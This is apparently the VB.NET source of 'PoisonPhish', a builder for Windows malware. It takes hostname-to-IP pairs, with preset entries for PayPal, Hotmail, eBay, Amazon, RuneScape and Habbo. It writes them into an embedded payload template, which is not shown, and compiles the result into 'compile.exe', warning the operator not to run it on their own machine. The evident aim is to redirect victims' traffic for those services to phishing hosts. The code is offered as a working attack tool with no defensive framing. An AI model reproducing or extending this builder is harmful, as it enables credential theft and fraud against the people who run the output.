Imports System.IO
Imports System.Reflection


Public Class Main
    Structure changeHost
        Dim host As String
        Dim IP As String
        Dim tabIndex As Integer
        Dim tabIndex2 As Integer
    End Structure

    Structure hostStruc
        Dim IP As String
        Dim host As String
    End Structure

    Dim clickSender As Integer

    Function sort(ByVal array() As changeHost, ByVal switch As Integer)
        Dim swapped As Boolean = False
        If switch = 1 Then
            Do
                swapped = False
                For y As Integer = 0 To array.Length - 2
                    If array(y).tabIndex2 > array(y + 1).tabIndex2 Then
                        swapped = True
                        Dim storage(1) As String
                        storage(0) = array(y).IP
                        storage(1) = array(y).tabIndex2
                        array(y).IP = array(y + 1).IP
                        array(y).tabIndex2 = array(y + 1).tabIndex2
                        array(y + 1).IP = storage(0)
                        array(y + 1).tabIndex2 = storage(1)
                    End If
                Next
            Loop While swapped
        Else
            Do
                swapped = False
                For y As Integer = 0 To array.Length - 2
                    If array(y).tabIndex > array(y + 1).tabIndex Then
                        swapped = True
                        If switch = 0 Then
                            Dim storage As changeHost
                            storage = array(y)
                            array(y) = array(y + 1)
                            array(y + 1) = storage
                        Else
                            Dim storage As String
                            storage = array(y).IP
                            array(y).IP = array(y + 1).IP
                            array(y + 1).IP = storage
                        End If
                    End If
                Next
            Loop While swapped
        End If
        Return array
    End Function

    Sub export()
        Dim change(14) As changeHost
        Dim x As Integer = 0
        For Each cntrl As Control In hostPanel.Controls
            change(x).host = cntrl.Text
            change(x).tabIndex = cntrl.TabIndex
            x += 1
        Next
        change = sort(change, 0)

        x = 0
        For Each cntrl As Control In IPPanel.Controls
            change(x).IP = cntrl.Text
            change(x).tabIndex2 = cntrl.TabIndex
            x += 1
        Next
        change = sort(change, 1)
        Dim hosts(count(change) - 1) As hostStruc
        For z As Integer = 0 To change.Length - 1
            If change(z).host <> Nothing And change(z).IP <> Nothing Then
                hosts(z).IP = change(z).IP
                hosts(z).host = change(z).host
            End If
        Next

        Call createfile(hosts)

        Call compile()

    End Sub

    Sub compile()
        Try
            If System.IO.File.Exists("compile.exe") Then
                System.IO.File.Delete("compile.exe")
            End If
            If System.IO.File.Exists("custom.ico") Then
                Shell("vbc.exe compile /win32icon:custom.ico /r:system.dll,system.drawing.dll,system.windows.forms.dll")
            Else
                Shell("vbc.exe compile /win32icon:default.ico /win32manifest:app.manifest /r:system.dll,system.drawing.dll,system.windows.forms.dll")
            End If
            'Shell("del " & System.Environment.CurrentDirectory & "\compile")
            Threading.Thread.Sleep(1500)
            'System.IO.File.Delete("compile")
            If System.IO.File.Exists("compile.exe") Then
                MessageBox.Show("Compilation complete." & vbNewLine & "Your compiled application (compile.exe) is now in this directory. It is advised that you do not open it on your own computer.", "Compilation Complete", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                MessageBox.Show("Compilation failed.", "Compilation Failed", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End If
        Catch ex As Exception
            If System.IO.File.Exists("compile") Then
                'System.IO.File.Delete("compile")
            End If
            MessageBox.Show("Compilation failed." & vbNewLine & "Please give debug.txt to blake for more help.", "Compilation Failed", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Dim file As String = "debug.txt"
            Dim debugwrite As New StreamWriter(file, True)
            debugwrite.WriteLine(Date.Now)
            debugwrite.WriteLine(ex.Message.ToString)
            debugwrite.WriteLine("---")
            debugwrite.Close()
        End Try
    End Sub

    Function count(ByVal change() As changeHost)
        Dim y As Integer
        For z As Integer = 0 To change.Length - 1
            If change(z).host <> Nothing And change(z).IP <> Nothing Then
                y += 1
            End If
        Next
        Return y
    End Function

    Sub createfile(ByVal hosts() As hostStruc)
        Dim file As String = System.Environment.CurrentDirectory & "/compile"
        Dim Writer As New IO.StreamWriter(file)
        Dim _assembly As Assembly = [Assembly].GetExecutingAssembly()

        Dim reader As New StreamReader(_assembly.GetManifestResourceStream("PoisonPhish.deployment.txt"))

        While reader.EndOfStream = False
            Dim readline = reader.ReadLine
            If InStr(readline, "'VARIABLES") = 0 Then
                Writer.WriteLine(readline)
            Else
                Writer.Write("Dim hosts() As hostStruc = {")
                For i As Integer = 0 To hosts.Length - 1
                    If i > 0 Then
                        Writer.Write(", ")
                    End If
                    Writer.Write("New hostStruc(""" & hosts(i).IP & """, """ & hosts(i).host & """)")
                Next
                Writer.Write("}" & vbNewLine)
            End If
        End While

        Writer.Close()
        reader.Close()
    End Sub

    Private Sub ExportToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExportToolStripMenuItem.Click
        If TextBox1.Text <> "" And TextBox15.Text <> "" Then
            Call export()
        Else
            MessageBox.Show("Data must not be empty")
        End If
    End Sub

    Private Sub Host_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox29.Click, TextBox28.Click, TextBox27.Click, TextBox26.Click, TextBox25.Click, TextBox24.Click, TextBox23.Click, TextBox22.Click, TextBox21.Click, TextBox20.Click, TextBox19.Click, TextBox18.Click, TextBox17.Click, TextBox16.Click, TextBox15.Click
        Dim temp As TextBox
        temp = sender
        Select Case temp.Name
            Case "TextBox15"
                clickSender = 1
            Case "TextBox16"
                clickSender = 2
            Case "TextBox17"
                clickSender = 3
            Case "TextBox18"
                clickSender = 4
            Case "TextBox19"
                clickSender = 5
            Case "TextBox20"
                clickSender = 6
            Case "TextBox21"
                clickSender = 7
            Case "TextBox22"
                clickSender = 8
            Case "TextBox23"
                clickSender = 9
            Case "TextBox24"
                clickSender = 10
            Case "TextBox25"
                clickSender = 11
            Case "TextBox26"
                clickSender = 12
            Case "TextBox27"
                clickSender = 13
            Case "TextBox28"
                clickSender = 14
            Case "TextBox29"
                clickSender = 15
            Case Else
                clickSender = 0
        End Select
    End Sub

    Private Sub CommonIPs_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Runescape.Click, Paypal.Click, Hotmail.Click, eBay.Click, Amazon.Click, HabboCOUK.Click, HabboCOM.Click
        Dim temp As ToolStripMenuItem
        temp = sender
        Select Case temp.Name
            Case "Paypal"
                '64.4.241.33
                fillBoxCommon("64.4.241.33", clickSender)
            Case "Runescape"
                '168.75.183.51
                fillBoxCommon("168.75.183.51", clickSender)
            Case "Hotmail"
                '65.54.186.17
                fillBoxCommon("65.54.186.17", clickSender)
            Case "eBay"
                '66.135.214.176
                fillBoxCommon("66.135.214.176", clickSender)
            Case "Amazon"
                '72.21.210.250
                fillBoxCommon("72.21.210.250", clickSender)
            Case "HabboCOM"
                '69.90.139.109
                fillBoxCommon("69.90.139.109", clickSender)
            Case "HabboCOUK"
                '62.50.35.182
                fillBoxCommon("62.50.35.182", clickSender)
        End Select

        clickSender = 0
    End Sub

    Sub fillBoxCommon(ByVal IP As String, ByVal sender As Integer)
        Select Case sender
            Case 1
                TextBox15.Text = IP
            Case 2
                TextBox16.Text = IP
            Case 3
                TextBox17.Text = IP
            Case 4
                TextBox18.Text = IP
            Case 5
                TextBox19.Text = IP
            Case 6
                TextBox20.Text = IP
            Case 7
                TextBox21.Text = IP
            Case 8
                TextBox22.Text = IP
            Case 9
                TextBox23.Text = IP
            Case 10
                TextBox24.Text = IP
            Case 11
                TextBox25.Text = IP
            Case 12
                TextBox26.Text = IP
            Case 13
                TextBox27.Text = IP
            Case 14
                TextBox28.Text = IP
            Case 15
                TextBox29.Text = IP
        End Select
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        MessageBox.Show("Developed by blake@stond.org")
    End Sub

End Class
